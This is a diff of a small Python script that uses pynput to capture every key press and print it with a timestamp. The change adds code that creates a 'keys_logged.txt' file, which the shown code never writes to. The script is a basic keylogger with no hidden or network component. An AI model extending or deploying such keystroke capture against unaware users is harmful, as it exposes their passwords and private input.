@@ -1,12 +1,12 @@
 from pynput.keyboard import Key, Listener
 from datetime import date, datetime
 
-
-
-
 #this function creates a txt file
 def create_txt():
    keys_logged_file = open("keys_logged.txt", "a")
+
+#we create a txt file
+create_txt()
 
 #this function prints the pressed key
 def on_press(key):
@@ -16,6 +16,8 @@ def on_press(key):
    print(f'{today} {time_now}', end = ": ")
    print(key)
 
+
+#this is where the logging starts
 while True:
    
    with Listener(on_press = on_press) as listener:
